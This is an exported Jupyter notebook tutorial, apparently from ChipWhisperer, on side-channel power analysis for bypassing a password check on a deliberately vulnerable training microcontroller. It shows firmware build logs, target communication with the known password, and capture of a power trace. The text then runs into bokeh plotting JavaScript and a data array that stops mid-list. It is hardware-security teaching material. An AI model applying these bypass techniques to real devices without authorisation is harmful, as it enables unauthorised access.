
Timing Analysis with Power for Password Bypass
==============================================

Supported setups:

SCOPES:

-  OPENADC
-  CWNANO

PLATFORMS:

-  CWLITEARM
-  CWLITEXMEGA
-  CWNANO

This tutorial will introduce you to breaking devices by determining when
a device is performing certain operations. It will use a simple password
check, and demonstrate how to perform a basic power analysis.

Note this is not a prerequisite to the tutorial on breaking AES. You can
skip this tutorial if you wish to go ahead with the AES tutorial.


**In [1]:**

.. code:: ipython3

    SCOPETYPE = 'OPENADC'
    PLATFORM = 'CWLITEXMEGA'
    CRYPTO_TARGET = 'NONE'

Firmware
--------

Like before, we'll need to setup our ``PLATFORM``, then build the
firmware:


**In [2]:**

.. code:: bash

    %%bash -s "$PLATFORM" "$CRYPTO_TARGET"
    cd ../hardware/victims/firmware/basic-passwdcheck
    make PLATFORM=$1 CRYPTO_TARGET=$2


**Out [2]:**



.. parsed-literal::

    rm -f -- basic-passwdcheck-CWLITEXMEGA.hex
    rm -f -- basic-passwdcheck-CWLITEXMEGA.eep
    rm -f -- basic-passwdcheck-CWLITEXMEGA.cof
    rm -f -- basic-passwdcheck-CWLITEXMEGA.elf
    rm -f -- basic-passwdcheck-CWLITEXMEGA.map
    rm -f -- basic-passwdcheck-CWLITEXMEGA.sym
    rm -f -- basic-passwdcheck-CWLITEXMEGA.lss
    rm -f -- objdir/\*.o
    rm -f -- objdir/\*.lst
    rm -f -- basic-passwdcheck.s simpleserial.s XMEGA_AES_driver.s uart.s usart_driver.s xmega_hal.s
    rm -f -- basic-passwdcheck.d simpleserial.d XMEGA_AES_driver.d uart.d usart_driver.d xmega_hal.d
    rm -f -- basic-passwdcheck.i simpleserial.i XMEGA_AES_driver.i uart.i usart_driver.i xmega_hal.i
    .
    -------- begin --------
    avr-gcc (WinAVR 20100110) 4.3.3
    Copyright (C) 2008 Free Software Foundation, Inc.
    This is free software; see the source for copying conditions.  There is NO
    warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
    
    .
    Compiling C: basic-passwdcheck.c
    avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_0 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/basic-passwdcheck.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/basic-passwdcheck.o.d basic-passwdcheck.c -o objdir/basic-passwdcheck.o 
    .
    Compiling C: .././simpleserial/simpleserial.c
    avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_0 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/simpleserial.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/simpleserial.o.d .././simpleserial/simpleserial.c -o objdir/simpleserial.o 
    .
    Compiling C: .././hal/xmega/XMEGA_AES_driver.c
    avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_0 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/XMEGA_AES_driver.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/XMEGA_AES_driver.o.d .././hal/xmega/XMEGA_AES_driver.c -o objdir/XMEGA_AES_driver.o 
    .
    Compiling C: .././hal/xmega/uart.c
    avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_0 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/uart.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/uart.o.d .././hal/xmega/uart.c -o objdir/uart.o 
    .
    Compiling C: .././hal/xmega/usart_driver.c
    avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_0 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/usart_driver.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/usart_driver.o.d .././hal/xmega/usart_driver.c -o objdir/usart_driver.o 
    .
    Compiling C: .././hal/xmega/xmega_hal.c
    avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_0 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/xmega_hal.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/xmega_hal.o.d .././hal/xmega/xmega_hal.c -o objdir/xmega_hal.o 
    .
    Linking: basic-passwdcheck-CWLITEXMEGA.elf
    avr-gcc -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_0 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/basic-passwdcheck.o -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/basic-passwdcheck-CWLITEXMEGA.elf.d objdir/basic-passwdcheck.o objdir/simpleserial.o objdir/XMEGA_AES_driver.o objdir/uart.o objdir/usart_driver.o objdir/xmega_hal.o --output basic-passwdcheck-CWLITEXMEGA.elf -Wl,-Map=basic-passwdcheck-CWLITEXMEGA.map,--cref   -lm  
    .
    Creating load file for Flash: basic-passwdcheck-CWLITEXMEGA.hex
    avr-objcopy -O ihex -R .eeprom -R .fuse -R .lock -R .signature basic-passwdcheck-CWLITEXMEGA.elf basic-passwdcheck-CWLITEXMEGA.hex
    .
    Creating load file for EEPROM: basic-passwdcheck-CWLITEXMEGA.eep
    avr-objcopy -j .eeprom --set-section-flags=.eeprom="alloc,load" \
    	--change-section-lma .eeprom=0 --no-change-warnings -O ihex basic-passwdcheck-CWLITEXMEGA.elf basic-passwdcheck-CWLITEXMEGA.eep \|\| exit 0
    .
    Creating Extended Listing: basic-passwdcheck-CWLITEXMEGA.lss
    avr-objdump -h -S -z basic-passwdcheck-CWLITEXMEGA.elf > basic-passwdcheck-CWLITEXMEGA.lss
    .
    Creating Symbol Table: basic-passwdcheck-CWLITEXMEGA.sym
    avr-nm -n basic-passwdcheck-CWLITEXMEGA.elf > basic-passwdcheck-CWLITEXMEGA.sym
    Size after:
       text	   data	    bss	    dec	    hex	filename
       2630	    304	    260	   3194	    c7a	basic-passwdcheck-CWLITEXMEGA.elf
    +--------------------------------------------------------
    + Built for platform CW-Lite XMEGA
    +--------------------------------------------------------



Setup
-----

Setup is the same as usual, except this time we'll be capturing 2000
traces.


**In [3]:**

.. code:: ipython3

    %run "Helper_Scripts/Setup_Generic.ipynb"


**In [4]:**

.. code:: ipython3

    fw_path = '../hardware/victims/firmware/basic-passwdcheck/basic-passwdcheck-{}.hex'.format(PLATFORM)


**In [5]:**

.. code:: ipython3

    cw.program_target(scope, prog, fw_path)


**Out [5]:**



.. parsed-literal::

    XMEGA Programming flash...
    XMEGA Reading flash...
    Verified flash OK, 2933 bytes
    


Communicating With The Target
-----------------------------

As was mentioned at the beginning of the tutorial, the firmware we
loaded onto the target implements a basic password check. After getting
a ``'\n'`` terminated password, the target checks it and enters an
infinite loop, so before communicating with it, we'll need to reset it.

We'll be doing this a lot, so we'll define a function that resets the
target (this function is also available by running
"Helper\_Scripts/Setup.ipynb" as we did above):


**In [6]:**

.. code:: ipython3

    import time
    def reset_target(scope):
        if PLATFORM == "CW303" or PLATFORM == "CWLITEXMEGA":
            scope.io.pdic = 'low'
            time.sleep(0.05)
            scope.io.pdic = 'high'
            time.sleep(0.05)
        else:  
            scope.io.nrst = 'low'
            time.sleep(0.05)
            scope.io.nrst = 'high'
            time.sleep(0.05)

The target sends some text to us upon starting. After running the block
below, you should see some text appear.

**NOTE** The text may appear cutoff, accompanied by a message about data
loss. This means that the buffer used to store serial data (128 bytes)
from the target is full. This isn't an issue here, since the text is
just aesthetic, but keep this in mind if you want to do large transfers
of serial data using ChipWhisperer.


**In [7]:**

.. code:: ipython3

    ret = ""
    reset_target(scope)
    
    num_char = target.in_waiting()
    while num_char > 0:
        ret += target.read(timeout=10)
        time.sleep(0.05)
        num_char = target.in_waiting()
        
    print(ret)


**Out [7]:**



.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

     \*\*\*\*\*Safe-o-matic 3000 Booting...
    Aligning bits........[DONE]
    Checking Cesium RNG..[DONE]
    Masq\*\*\*\*\*Safe-o-matic 3000 Booting.Decrypting database..[DONE]
    
    
    WARNING: UNAUTHORIZED ACCESS WILL BE PUNISHED
    Please enter password to continue: 
    


Now we can send the target a password:


**In [8]:**

.. code:: ipython3

    target.flush()
    target.write("h0px3\n")

And get the response. We sent it the right password (hopx3), so you
should see "Access granted, Welcome!":


**In [9]:**

.. code:: ipython3

    print(target.read(timeout=100))


**Out [9]:**



.. parsed-literal::

    Access granted, Welcome!
    
    


**tip**

In real systems, you may often know one of the passwords, which is
sufficient to investigate the password checking routines as we will do.
You also normally have an ability to reset passwords to default. While
the reset procedure would erase any data you care about, the attacker
will be able to use this 'sacrificial' device to learn about possible
vulnerabilities. So the assumption that we have access to the password
is really just saying we have access to a password, and will use that
knowledge to break the system in general.

Recording Traces
----------------

Now that we can communicate with our super-secure system, our next goal
is to get a power trace while the target is running. To do this, we'll
arm the scope just before we send our password attempt, then record the
trace as we've done before.


**In [10]:**

.. code:: ipython3

    if PLATFORM == "CWNANO":
        scope.adc.samples = 800
    else:
        scope.adc.samples = 2000


**In [11]:**

.. code:: ipython3

    ret = ""
    reset_target(scope)
    num_char = target.in_waiting()
    while num_char > 0:
        ret += target.read(timeout=10)
        time.sleep(0.01)
        num_char = target.in_waiting()
        
    print(ret)
    scope.arm()
    target.flush()
    target.write("h0px3\n")
    ret = scope.capture()
    if ret:
        print('Timeout happened during acquisition')
            
    trace = scope.get_last_trace()
    resp = ""
    num_char = target.in_waiting()
    while num_char > 0:
        resp += target.read(timeout=10)
        time.sleep(0.01)
        num_char = target.in_waiting()
    print(resp)


**Out [11]:**



.. parsed-literal::

     \*\*\*\*\*Safe-o-matic 3000 Booting...
    Aligning bits........[DONE]
    Checking Cesium RNG..[DONE]
    Masquerading flash...[DONE]
    Decrypting database..[DONE]
    
    
    WARNING: UNAUTHORIZED ACCESS WILL BE PUNISHED
    Please enter password to continue: 
    Access granted, Welcome!
    
    


Now that we have a trace, we'll use bokeh to plot it:


**In [12]:**

.. code:: ipython3

    from bokeh.plotting import figure, show 
    from bokeh.io import output_notebook
    from bokeh.models import CrosshairTool
    
    output_notebook()
    p = figure()
    x_range = range(0, len(trace))
    p.line(x_range, trace)
    show(p)


**Out [12]:**


.. raw:: html

    <div class="data_html">
        
        <div class="bk-root">
            <a href="https://bokeh.pydata.org" target="_blank" class="bk-logo bk-logo-small bk-logo-notebook"></a>
            <span id="1001">Loading BokehJS ...</span>
        </div>
    </div>



.. raw:: html

    

    <div id="a32bcd03-509e-409f-911a-7d5258c9bf70"></div>
    <div class="output_subarea output_javascript ">
    <script type="text/javascript">
    var element = $('#a32bcd03-509e-409f-911a-7d5258c9bf70');
        
    (function(root) {
      function now() {
        return new Date();
      }
    
      var force = true;
    
      if (typeof root._bokeh_onload_callbacks === "undefined" || force === true) {
        root._bokeh_onload_callbacks = [];
        root._bokeh_is_loading = undefined;
      }
    
      var JS_MIME_TYPE = 'application/javascript';
      var HTML_MIME_TYPE = 'text/html';
      var EXEC_MIME_TYPE = 'application/vnd.bokehjs_exec.v0+json';
      var CLASS_NAME = 'output_bokeh rendered_html';
    
      /**
       * Render data to the DOM node
       */
      function render(props, node) {
        var script = document.createElement("script");
        node.appendChild(script);
      }
    
      /**
       * Handle when an output is cleared or removed
       */
      function handleClearOutput(event, handle) {
        var cell = handle.cell;
    
        var id = cell.output_area._bokeh_element_id;
        var server_id = cell.output_area._bokeh_server_id;
        // Clean up Bokeh references
        if (id != null && id in Bokeh.index) {
          Bokeh.index[id].model.document.clear();
          delete Bokeh.index[id];
        }
    
        if (server_id !== undefined) {
          // Clean up Bokeh references
          var cmd = "from bokeh.io.state import curstate; print(curstate().uuid_to_server['" + server_id + "'].get_sessions()[0].document.roots[0]._id)";
          cell.notebook.kernel.execute(cmd, {
            iopub: {
              output: function(msg) {
                var id = msg.content.text.trim();
                if (id in Bokeh.index) {
                  Bokeh.index[id].model.document.clear();
                  delete Bokeh.index[id];
                }
              }
            }
          });
          // Destroy server and session
          var cmd = "import bokeh.io.notebook as ion; ion.destroy_server('" + server_id + "')";
          cell.notebook.kernel.execute(cmd);
        }
      }
    
      /**
       * Handle when a new output is added
       */
      function handleAddOutput(event, handle) {
        var output_area = handle.output_area;
        var output = handle.output;
    
        // limit handleAddOutput to display_data with EXEC_MIME_TYPE content only
        if ((output.output_type != "display_data") || (!output.data.hasOwnProperty(EXEC_MIME_TYPE))) {
          return
        }
    
        var toinsert = output_area.element.find("." + CLASS_NAME.split(' ')[0]);
    
        if (output.metadata[EXEC_MIME_TYPE]["id"] !== undefined) {
          toinsert[toinsert.length - 1].firstChild.textContent = output.data[JS_MIME_TYPE];
          // store reference to embed id on output_area
          output_area._bokeh_element_id = output.metadata[EXEC_MIME_TYPE]["id"];
        }
        if (output.metadata[EXEC_MIME_TYPE]["server_id"] !== undefined) {
          var bk_div = document.createElement("div");
          bk_div.innerHTML = output.data[HTML_MIME_TYPE];
          var script_attrs = bk_div.children[0].attributes;
          for (var i = 0; i < script_attrs.length; i++) {
            toinsert[toinsert.length - 1].firstChild.setAttribute(script_attrs[i].name, script_attrs[i].value);
          }
          // store reference to server id on output_area
          output_area._bokeh_server_id = output.metadata[EXEC_MIME_TYPE]["server_id"];
        }
      }
    
      function register_renderer(events, OutputArea) {
    
        function append_mime(data, metadata, element) {
          // create a DOM node to render to
          var toinsert = this.create_output_subarea(
            metadata,
            CLASS_NAME,
            EXEC_MIME_TYPE
          );
          this.keyboard_manager.register_events(toinsert);
          // Render to node
          var props = {data: data, metadata: metadata[EXEC_MIME_TYPE]};
          render(props, toinsert[toinsert.length - 1]);
          element.append(toinsert);
          return toinsert
        }
    
        /* Handle when an output is cleared or removed */
        events.on('clear_output.CodeCell', handleClearOutput);
        events.on('delete.Cell', handleClearOutput);
    
        /* Handle when a new output is added */
        events.on('output_added.OutputArea', handleAddOutput);
    
        /**
         * Register the mime type and append_mime function with output_area
         */
        OutputArea.prototype.register_mime_type(EXEC_MIME_TYPE, append_mime, {
          /* Is output safe? */
          safe: true,
          /* Index of renderer in `output_area.display_order` */
          index: 0
        });
      }
    
      // register the mime type if in Jupyter Notebook environment and previously unregistered
      if (root.Jupyter !== undefined) {
        var events = require('base/js/events');
        var OutputArea = require('notebook/js/outputarea').OutputArea;
    
        if (OutputArea.prototype.mime_types().indexOf(EXEC_MIME_TYPE) == -1) {
          register_renderer(events, OutputArea);
        }
      }
    
      
      if (typeof (root._bokeh_timeout) === "undefined" || force === true) {
        root._bokeh_timeout = Date.now() + 5000;
        root._bokeh_failed_load = false;
      }
    
      var NB_LOAD_WARNING = {'data': {'text/html':
         "<div style='background-color: #fdd'>\n"+
         "<p>\n"+
         "BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \n"+
         "may be due to a slow or bad network connection. Possible fixes:\n"+
         "</p>\n"+
         "<ul>\n"+
         "<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\n"+
         "<li>use INLINE resources instead, as so:</li>\n"+
         "</ul>\n"+
         "<code>\n"+
         "from bokeh.resources import INLINE\n"+
         "output_notebook(resources=INLINE)\n"+
         "</code>\n"+
         "</div>"}};
    
      function display_loaded() {
        var el = document.getElementById("1001");
        if (el != null) {
          el.textContent = "BokehJS is loading...";
        }
        if (root.Bokeh !== undefined) {
          if (el != null) {
            el.textContent = "BokehJS " + root.Bokeh.version + " successfully loaded.";
          }
        } else if (Date.now() < root._bokeh_timeout) {
          setTimeout(display_loaded, 100)
        }
      }
    
    
      function run_callbacks() {
        try {
          root._bokeh_onload_callbacks.forEach(function(callback) {
            if (callback != null)
              callback();
          });
        } finally {
          delete root._bokeh_onload_callbacks
        }
        console.debug("Bokeh: all callbacks have finished");
      }
    
      function load_libs(css_urls, js_urls, callback) {
        if (css_urls == null) css_urls = [];
        if (js_urls == null) js_urls = [];
    
        root._bokeh_onload_callbacks.push(callback);
        if (root._bokeh_is_loading > 0) {
          console.debug("Bokeh: BokehJS is being loaded, scheduling callback at", now());
          return null;
        }
        if (js_urls == null || js_urls.length === 0) {
          run_callbacks();
          return null;
        }
        console.debug("Bokeh: BokehJS not loaded, scheduling load and callback at", now());
        root._bokeh_is_loading = css_urls.length + js_urls.length;
    
        function on_load() {
          root._bokeh_is_loading--;
          if (root._bokeh_is_loading === 0) {
            console.debug("Bokeh: all BokehJS libraries/stylesheets loaded");
            run_callbacks()
          }
        }
    
        function on_error() {
          console.error("failed to load " + url);
        }
    
        for (var i = 0; i < css_urls.length; i++) {
          var url = css_urls[i];
          const element = document.createElement("link");
          element.onload = on_load;
          element.onerror = on_error;
          element.rel = "stylesheet";
          element.type = "text/css";
          element.href = url;
          console.debug("Bokeh: injecting link tag for BokehJS stylesheet: ", url);
          document.body.appendChild(element);
        }
    
        for (var i = 0; i < js_urls.length; i++) {
          var url = js_urls[i];
          var element = document.createElement('script');
          element.onload = on_load;
          element.onerror = on_error;
          element.async = false;
          element.src = url;
          console.debug("Bokeh: injecting script tag for BokehJS library: ", url);
          document.head.appendChild(element);
        }
      };var element = document.getElementById("1001");
      if (element == null) {
        console.error("Bokeh: ERROR: autoload.js configured with elementid '1001' but no matching script tag was found. ")
        return false;
      }
    
      function inject_raw_css(css) {
        const element = document.createElement("style");
        element.appendChild(document.createTextNode(css));
        document.body.appendChild(element);
      }
    
      var js_urls = ["https://cdn.pydata.org/bokeh/release/bokeh-1.2.0.min.js", "https://cdn.pydata.org/bokeh/release/bokeh-widgets-1.2.0.min.js", "https://cdn.pydata.org/bokeh/release/bokeh-tables-1.2.0.min.js", "https://cdn.pydata.org/bokeh/release/bokeh-gl-1.2.0.min.js"];
      var css_urls = ["https://cdn.pydata.org/bokeh/release/bokeh-1.2.0.min.css", "https://cdn.pydata.org/bokeh/release/bokeh-widgets-1.2.0.min.css", "https://cdn.pydata.org/bokeh/release/bokeh-tables-1.2.0.min.css"];
    
      var inline_js = [
        function(Bokeh) {
          Bokeh.set_log_level("info");
        },
        
        function(Bokeh) {
          
        },
        function(Bokeh) {} // ensure no trailing comma for IE
      ];
    
      function run_inline_js() {
        
        if ((root.Bokeh !== undefined) || (force === true)) {
          for (var i = 0; i < inline_js.length; i++) {
            inline_js[i].call(root, root.Bokeh);
          }if (force === true) {
            display_loaded();
          }} else if (Date.now() < root._bokeh_timeout) {
          setTimeout(run_inline_js, 100);
        } else if (!root._bokeh_failed_load) {
          console.log("Bokeh: BokehJS failed to load within specified timeout.");
          root._bokeh_failed_load = true;
        } else if (force !== true) {
          var cell = $(document.getElementById("1001")).parents('.cell').data().cell;
          cell.output_area.append_execute_result(NB_LOAD_WARNING)
        }
    
      }
    
      if (root._bokeh_is_loading === 0) {
        console.debug("Bokeh: BokehJS loaded, going straight to plotting");
        run_inline_js();
      } else {
        load_libs(css_urls, js_urls, function() {
          console.debug("Bokeh: BokehJS plotting callback run at", now());
          run_inline_js();
        });
      }
    }(window));
    </script>
    </div>


.. raw:: html

    <div class="data_html">
        
    
    
    
    
    
      <div class="bk-root" id="341f6aab-a2e3-499f-b163-eb9798508376" data-root-id="1002"></div>
    
    </div>



.. raw:: html

    

    <div id="31703976-bd35-4c50-b4d5-0c85f978821a"></div>
    <div class="output_subarea output_javascript ">
    <script type="text/javascript">
    var element = $('#31703976-bd35-4c50-b4d5-0c85f978821a');
        (function(root) {
      function embed_document(root) {
        
      var docs_json = {"c11b3e78-69c9-4c3f-98ac-5988346f6820":{"roots":{"references":[{"attributes":{"below":[{"id":"1011","type":"LinearAxis"}],"center":[{"id":"1015","type":"Grid"},{"id":"1020","type":"Grid"}],"left":[{"id":"1016","type":"LinearAxis"}],"renderers":[{"id":"1037","type":"GlyphRenderer"}],"title":{"id":"1039","type":"Title"},"toolbar":{"id":"1027","type":"Toolbar"},"x_range":{"id":"1003","type":"DataRange1d"},"x_scale":{"id":"1007","type":"LinearScale"},"y_range":{"id":"1005","type":"DataRange1d"},"y_scale":{"id":"1009","type":"LinearScale"}},"id":"1002","subtype":"Figure","type":"Plot"},{"attributes":{},"id":"1009","type":"LinearScale"},{"attributes":{"formatter":{"id":"1041","type":"BasicTickFormatter"},"ticker":{"id":"1012","type":"BasicTicker"}},"id":"1011","type":"LinearAxis"},{"attributes":{},"id":"1017","type":"BasicTicker"},{"attributes":{},"id":"1012","type":"BasicTicker"},{"attributes":{"ticker":{"id":"1012","type":"BasicTicker"}},"id":"1015","type":"Grid"},{"attributes":{"line_color":"#1f77b4","x":{"field":"x"},"y":{"field":"y"}},"id":"1035","type":"Line"},{"attributes":{"dimension":1,"ticker":{"id":"1017","type":"BasicTicker"}},"id":"1020","type":"Grid"},{"attributes":{"formatter":{"id":"1043","type":"BasicTickFormatter"},"ticker":{"id":"1017","type":"BasicTicker"}},"id":"1016","type":"LinearAxis"},{"attributes":{"source":{"id":"1034","type":"ColumnDataSource"}},"id":"1038","type":"CDSView"},{"attributes":{"active_drag":"auto","active_inspect":"auto","active_multi":null,"active_scroll":"auto","active_tap":"auto","tools":[{"id":"1021","type":"PanTool"},{"id":"1022","type":"WheelZoomTool"},{"id":"1023","type":"BoxZoomTool"},{"id":"1024","type":"SaveTool"},{"id":"1025","type":"ResetTool"},{"id":"1026","type":"HelpTool"}]},"id":"1027","type":"Toolbar"},{"attributes":{},"id":"1021","type":"PanTool"},{"attributes":{},"id":"1022","type":"WheelZoomTool"},{"attributes":{"overlay":{"id":"1047","type":"BoxAnnotation"}},"id":"1023","type":"BoxZoomTool"},{"attributes":{},"id":"1024","type":"SaveTool"},{"attributes":{},"id":"1025","type":"ResetTool"},{"attributes":{"line_alpha":0.1,"line_color":"#1f77b4","x":{"field":"x"},"y":{"field":"y"}},"id":"1036","type":"Line"},{"attributes":{},"id":"1026","type":"HelpTool"},{"attributes":{"data_source":{"id":"1034","type":"ColumnDataSource"},"glyph":{"id":"1035","type":"Line"},"hover_glyph":null,"muted_glyph":null,"nonselection_glyph":{"id":"1036","type":"Line"},"selection_glyph":null,"view":{"id":"1038","type":"CDSView"}},"id":"1037","type":"GlyphRenderer"},{"attributes":{"text":""},"id":"1039","type":"Title"},{"attributes":{},"id":"1045","type":"Selection"},{"attributes":{},"id":"1046","type":"UnionRenderers"},{"attributes":{},"id":"1043","type":"BasicTickFormatter"},{"attributes":{},"id":"1041","type":"BasicTickFormatter"},{"attributes":{"bottom_units":"screen","fill_alpha":{"value":0.5},"fill_color":{"value":"lightgrey"},"left_units":"screen","level":"overlay","line_alpha":{"value":1.0},"line_color":{"value":"black"},"line_dash":[4,4],"line_width":{"value":2},"render_mode":"css","right_units":"screen","top_units":"screen"},"id":"1047","type":"BoxAnnotation"},{"attributes":{"callback":null},"id":"1003","type":"DataRange1d"},{"attributes":{"callback":null,"data":{"x":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,265,266,267,268,269,270,271,272,273,274,275,276,277,278,279,280,281,282,283,284,285,286,287,288,289,290,291,292,293,294,295,296,297,298,299,300,301,302,303,304,305,306,307,308,309,310,311,312,313,314,315,316,317,318,319,320,321,322,323,324,325,326,327,328,329,330,331,332,333,334,335,336,337,338,339,340,341,342,343,344,345,346,347,348,349,350,351,352,353,354,355,356,357,358,359,360,361,362,363,364,365,366,367,368,369,370,371,372,373,374,375,376,377,378,379,380,381,382,383,384,385,386,387,388,389,390,391,392,393,394,395,396,397,398,399,400,401,402,403,404,405,406,407,408,409,410,411,412,413,414,415,416,417,418,419,420,421,422,423,424,425,426,427,428,429,430,431,432,433,434,435,436,437,438,439,440,441,442,443,444,445,446,447,448,449,450,451,452,453,454,455,456,457,458,459,460,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,476,477,478,479,480,481,482,483,484,485,486,487,488,489,490,491,492,493,494,495,496,497,498,499,500,501,502,503,504,505,506,507,508,509,510,511,512,513,514,515,516,517,518,519,520,521,522,523,524,525,526,527,528,529,530,531,532,533,534,535,536,537,538,539,540,541,542,543,544,545,546,547,548,549,550,551,552,553,554,555,556,557,558,559,560,561,562,563,564,565,566,567,568,569,570,571,572,573,574,575,576,577,578,579,580,581,582,583,584,585,586,587,588,589,590,591,592,593,594,595,596,597,598,599,600,601,602,603,604,605,606,607,608,609,610,611,612,613,614,615,616,617,618,619,620,621,622,623,624,625,626,627,628,629,630,631,632,633,634,635,636,637,638,639,640,641,642,643,644,645,646,647,648,649,650,651,652,653,654,655,656,657,658,659,660,661,662,663,664,665,666,667,668,669,670,671,672,673,674,675,676,677,678,679,680,681,682,683,684,685,686,687,688,689,690,691,692,693,694,695,696,697,698,699,700,701,702,703,704,705,706,707,708,709,710,711,712,713,714,715,716,717,718,719,720,721,722,723,724,725,726,727,728,729,730,731,732,733,734,735,736,737,738,739,740,741,742,743,744,745,746,747,748,749,750,751,752,753,754,755,756,757,758,759,760,761,762,763,764,765,766,767,768,769,770,771,772,773,774,775,776,777,778,779,780,781,782,783,784,785,786,787,788,789,790,791,792,793,794,795,796,797,798,799,800,801,802,803,804,805,806,807,808,809,810,811,812,813,814,815,816,817,818,819,820,821,822,823,824,825,826,827,828,829,830,831,832,833,834,835,836,837,838,839,840,841,842,843,844,845,846,847,848,849,850,851,852,853,854,855,856,857,858,859,860,861,862,863,864,865,866,867,868,869,870,871,872,873,874,875,876,877,878,879,880,881,882,883,884,885,886,887,888,889,890,891,892,893,894,895,896,897,898,899,900,901,902,903,904,905,906,907,908,909,910,911,912,913,914,915,916,917,918,919,920,921,922,923,924,925,926,927,928,929,930,931,932,933,934,935,936,937,938,939,940,941,942,943,944,945,946,947,948,949,950,951,952,953,954,955,956,957,958,959,960,961,962,963,964,965,966,967,968,969,970,971,972,973,974,975,976,977,978,979,980,981,982,983,984,985,986,987,988,989,990,991,992,993,994,995,996,997,998,999,1000,1001,1002,1003,1004,1005,1006,1007,1008,1009,1010,1011,1012,1013,1014,1015,1016,1017,1018,1019,1020,1021,1022,1023,1024,1025,1026,1027,1028,1029,1030,1031,1032,1033,1034,1035,1036,1037,1038,1039,1040,1041,1042,1043,1044,1045,1046,1047,1048,1049,1050,1051,1052,1053,1054,1055,1056,1057,1058,1059,1060,1061,1062,1063,1064,1065,1066,1067,1068,1069,1070,1071,1072,1073,1074,1075,1076,1077,1078,1079,1080,1081,1082,1083,1084,1085,1086,1087,1088,1089,1090,1091,1092,1093,1094,1095,1096,1097,1098,1099,1100,1101,1102,1103,1104,1105,1106,1107,1108,1109,1110,1111,1112,1113,1114,1115,1116,1117,1118,1119,1120,1121,1122,1123,1124,1125,1126,1127,1128,1129,1130,1131,1132,1133,1134,1135,1136,1137,1138,1139,1140,1141,1142,1143,1144,1145,1146,1147,1148,1149,1150,1151,1152,1153,1154,1155,1156,1157,1158,1159,1160,1161,1162,1163,1164,1165,1166,1167,1168,1169,1170,1171,1172,1173,1174,1175,1176,1177,1178,1179,1180,1181,1182,1183,1184,1185,1186,1187,1188,1189,1190,1191,1192,1193,1194,1195,1196,1197,1198,1199,1200,1201,1202,1203,1204,1205,1206,1207,1208,1209,1210,1211,1212,1213,1214,1215,1216,1217,1218,1219,1220,1221,1222,1223,1224,1225,1226,1227,1228,1229,1230,1231,1232,1233,1234,1235,1236,1237,1238,1239,1240,1